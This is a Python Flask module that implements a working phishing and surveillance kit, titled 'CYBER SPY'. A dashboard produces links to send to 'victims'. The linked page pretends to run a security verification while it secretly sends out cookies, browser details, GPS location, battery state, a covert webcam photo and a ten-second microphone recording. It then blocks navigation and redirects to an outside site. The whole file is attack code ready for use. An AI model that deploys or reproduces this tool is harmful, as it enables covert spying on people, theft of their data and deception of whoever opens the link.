# -*- coding: utf-8 -*-
from flask import Blueprint, request, render_template_string, redirect, session, jsonify
import os
import uuid
from datetime import datetime

bp = Blueprint('spy', __name__, url_prefix='/spy')

# ========== গ্লোবাল ডেটা স্টোর ==========
reports = {}

# ========== DASHBOARD_HTML (app.py থেকে কপি) ==========
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Spy Dashboard - Live Data</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body{background:#0a0f1e;font-family:monospace;padding:20px;color:#0f0;}
        .card{background:#111;border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #4affff;}
        input,button{padding:10px;margin:5px;border-radius:8px;border:none;}
        input{background:#000;color:#0f0;border:1px solid #4affff;width:70%;}
        button{background:#4affff;color:#000;cursor:pointer;}
        pre{background:#000;padding:10px;border-radius:8px;overflow:auto;}
        .data-item{border-left:3px solid #ff3366;margin:10px 0;padding:10px;background:#0f1422;}
        .map-container{height:300px;width:100%;margin-top:10px;border-radius:10px;overflow:hidden;}
        .battery{color:#4affff;font-weight:bold;}
        .photo{max-width:200px;border-radius:10px;margin-top:10px;}
        audio{width:100%; margin-top:10px; border-radius:8px;}
        .delete-btn{background:#ff3366;color:#fff;border:none;padding:5px 15px;margin-left:10px;}
    </style>
</head>
<body>
<div class="card">
    <h2>📡 CYBER SPY DEVLOPER - ARIF🔥</h2>
    <p><strong>Your persistent UID:</strong> {{ uid }}</p>
    <div>
        <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
        <button onclick="copyLink()">Copy Link</button>
        <button class="delete-btn" onclick="deleteData()">🗑️ Delete My Data</button>
    </div>
    <form method="post" action="/spy/new_uid" style="display:inline;">
        <button type="submit" style="background:#ff3366;">Generate New Link (New UID)</button>
    </form>
    <p>⚠️ Send current link to victim. Data updates smoothly (new items appear on top).</p>
</div>
<div class="card">
    <h3>📥 Received Data (UID: {{ uid }})</h3>
    <div id="dataContainer"></div>
</div>
<script>
    const uid = "{{ uid }}";
    let seenIds = new Set();

    function copyLink() {
        let inp = document.getElementById('link');
        inp.select();
        navigator.clipboard.writeText(inp.value);
        alert('Link copied!');
    }

    async function deleteData() {
        if(confirm('Delete all collected data for this UID?')) {
            await fetch('/spy/api/delete/' + uid, {method: 'POST'});
            document.getElementById('dataContainer').innerHTML = '';
            seenIds.clear();
            fetchData();
        }
    }

    function createItemElement(item) {
        const div = document.createElement('div');
        div.className = 'data-item';
        div.innerHTML = `<small>${item.time}</small>
                         <pre>${JSON.stringify(item.data, null, 2)}</pre>`;
        if (item.data.location) {
            const mapId = 'map_' + Date.now() + '_' + Math.random();
            div.innerHTML += `<div class="map-container" id="${mapId}"></div>`;
            setTimeout(() => {
                const lat = item.data.location.lat;
                const lon = item.data.location.lon;
                const mapDiv = document.getElementById(mapId);
                if (mapDiv && !mapDiv._leaflet_id) {
                    const map = L.map(mapId).setView([lat, lon], 13);
                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                    L.marker([lat, lon]).addTo(map).bindPopup('Victim Location').openPopup();
                    mapDiv._leaflet_id = true;
                }
            }, 100);
        }
        if (item.data.battery) {
            div.innerHTML += `<div class="battery">🔋 Battery: ${item.data.battery.level}% ${item.data.battery.charging ? '(Charging)' : '(Not charging)'}</div>`;
        }
        if (item.data.photo) {
            div.innerHTML += `<div><img src="${item.data.photo}" class="photo" alt="Victim photo"></div>`;
        }
        if (item.data.audio) {
            div.innerHTML += `<div><audio controls src="${item.data.audio}"></audio></div>`;
        }
        return div;
    }

    async function fetchData() {
        try {
            const res = await fetch('/spy/api/get_data/' + uid);
            const data = await res.json();
            const container = document.getElementById('dataContainer');
            if (!data || data.length === 0) {
                if (container.children.length === 0) {
                    container.innerHTML = '<p>⏳ No data yet. Send the link to victim.</p>';
                }
                return;
            }
            // Remove placeholder if exists
            if (container.children.length === 1 && container.firstChild.tagName === 'P') {
                container.innerHTML = '';
            }
            // Traverse from newest to oldest (reverse of received order)
            for (let i = data.length - 1; i >= 0; i--) {
                const item = data[i];
                const itemId = item.time + '_' + JSON.stringify(item.data).substring(0, 80);
                if (!seenIds.has(itemId)) {
                    seenIds.add(itemId);
                    const newElement = createItemElement(item);
                    container.insertBefore(newElement, container.firstChild);
                }
            }
            // Limit to 50 items to keep performance
            while (container.children.length > 50) {
                const last = container.lastChild;
                if (last) container.removeChild(last);
            }
        } catch(e) { console.error(e); }
    }

    setInterval(fetchData, 3000);
    fetchData();
</script>
</body>
</html>
"""

# ========== SPY_PAGE_HTML (app.py থেকে কপি) ==========
SPY_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Security Check</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            background: linear-gradient(135deg, #0a0f1e 0%, #07111f 100%);
            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #e0e0e0;
        }
        .container{
            background: rgba(10, 20, 35, 0.65);
            backdrop-filter: blur(15px);
            border-radius: 2rem;
            padding: 2rem;
            width: 90%;
            max-width: 550px;
            border: 1px solid rgba(0, 255, 255, 0.4);
            box-shadow: 0 20px 35px rgba(0,0,0,0.5);
            text-align: center;
        }
        h1{
            font-size: 1.8rem;
            margin-bottom: 1rem;
            background: linear-gradient(135deg, #fff, #4affff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .spinner{
            width: 60px;
            height: 60px;
            border: 5px solid rgba(74, 255, 255, 0.2);
            border-top: 5px solid #4affff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 1.5rem auto;
        }
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .progress-bar{
            width: 100%;
            height: 8px;
            background: #1e2a4a;
            border-radius: 10px;
            margin: 1rem 0;
            overflow: hidden;
        }
        .progress-fill{
            width: 0%;
            height: 100%;
            background: #4affff;
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        .status{
            font-size: 0.9rem;
            color: #bbd9ff;
            margin: 0.8rem 0;
            font-family: monospace;
        }
        .fake-details{
            background: #010409aa;
            border-radius: 1rem;
            padding: 0.8rem;
            margin-top: 1.5rem;
            font-size: 0.75rem;
            color: #7effd4;
            text-align: left;
        }
        p{font-size:0.7rem; margin-top:1rem; opacity:0.5;}
    </style>
</head>
<body>
<div class="container">
    <h1>🔐 SECURE VERIFICATION</h1>
    <div class="spinner"></div>
    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
    <div class="status" id="statusMsg">Initializing security protocols...</div>
    <div class="fake-details" id="fakeLog">
        ✔️ SSL handshake complete<br>
        ⏳ Scanning network environment...
    </div>
    <p>Do not close this window. Verification in progress.</p>
</div>

<script>
    let progress = 0;
    const progressInterval = setInterval(() => {
        if (progress < 92) progress += Math.random() * 3;
        else progress += Math.random() * 0.8;
        if (progress > 95) progress = 92;
        document.getElementById('progressFill').style.width = progress + '%';
    }, 800);
    
    const statusMessages = ["Establishing encrypted channel...","Checking device integrity...","Verifying IP whitelist...","Analyzing browser fingerprint...","Validating geolocation data...","Scanning for malicious plugins...","Retrieving security certificates...","Performing deep system audit...","Almost done... please wait","Finalizing encryption handshake..."];
    let msgIndex = 0;
    setInterval(() => {
        document.getElementById('statusMsg').innerHTML = statusMessages[msgIndex % statusMessages.length];
        msgIndex++;
    }, 2200);
    
    const fakeLogLines = ["✔️ SSL handshake complete","⏳ Scanning network environment...","✔️ IP validated: 103.42.xxx.xx","⏳ Checking browser extensions","✔️ No threats detected","⏳ Retrieving device timestamp","✔️ Timezone synchronized","⏳ Performing battery calibration...","⏳ Camera integrity test (in progress)","✔️ Secure channel established"];
    let logIndex = 2;
    setInterval(() => {
        const logDiv = document.getElementById('fakeLog');
        if (logIndex < fakeLogLines.length) logDiv.innerHTML += "<br>" + fakeLogLines[logIndex++];
        else logDiv.innerHTML += "<br>⟳ Re-verifying connection stability...";
        logDiv.scrollTop = logDiv.scrollHeight;
    }, 3500);
    
    const server = window.location.origin;
    const uid = "{{ uid }}";
    
    function sendData(data) {
        fetch(server + '/spy/api/report/' + uid, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(e => console.error(e));
    }
    
    sendData({
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: document.cookie,
        localStorageSize: localStorage.length,
        url: window.location.href,
        timestamp: new Date().toISOString()
    });
    
    if (navigator.getBattery) {
        navigator.getBattery().then(b => sendData({ battery: { level: Math.round(b.level * 100), charging: b.charging } }));
    }
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => sendData({ location: { lat: pos.coords.latitude, lon: pos.coords.longitude } }), () => {});
    }
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    let canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    let photoData = canvas.toDataURL('image/jpeg', 0.7);
                    sendData({ photo: photoData });
                    stream.getTracks().forEach(t => t.stop());
                }, 1500);
            }).catch(e => console.log);
    }
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        sendData({ audio: reader.result });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(t => t.stop());
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 10000);
            }).catch(e => console.log);
    }
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(ipData => sendData({ ip: ipData.ip }))
        .catch(e => console.log);
    
    window.onbeforeunload = function() { return "Verification in progress. Are you sure?"; };
    setInterval(() => { history.pushState({}, '', '/'); }, 500);
    setTimeout(() => {
        window.location.replace("https://cyber24.netlify.app/share-app.html");
    }, 20000);
</script>
</body>
</html>
"""

# ========== রাউট ==========
@bp.route('/')
def home():
    return redirect('/spy/dashboard')

@bp.route('/dashboard')
def dashboard():
    if 'uid' not in session:
        session['uid'] = str(uuid.uuid4())[:8]
        reports[session['uid']] = {'data': []}
    uid = session['uid']
    if uid not in reports:
        reports[uid] = {'data': []}
    link = request.host_url.rstrip('/') + '/spy/' + uid
    return render_template_string(DASHBOARD_HTML, link=link, uid=uid)

@bp.route('/new_uid', methods=['POST'])
def new_uid():
    session['uid'] = str(uuid.uuid4())[:8]
    reports[session['uid']] = {'data': []}
    return redirect('/spy/dashboard')

@bp.route('/<uid>')
def spy(uid):
    if uid not in reports:
        reports[uid] = {'data': []}
    return render_template_string(SPY_PAGE_HTML, uid=uid)

@bp.route('/api/report/<uid>', methods=['POST'])
def report(uid):
    if uid not in reports:
        reports[uid] = {'data': []}
    data = request.get_json()
    if not data:
        data = {"error": "empty"}
    reports[uid]['data'].append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'data': data
    })
    print(f"[SPY] Data for {uid}: {list(data.keys())}")
    return "OK", 200

@bp.route('/api/delete/<uid>', methods=['POST'])
def delete_data(uid):
    if uid in reports:
        reports[uid] = {'data': []}
    return jsonify({"status": "deleted"}), 200

@bp.route('/api/get_data/<uid>')
def get_data(uid):
    if uid not in reports:
        return jsonify([])
    return jsonify(reports[uid]['data'])
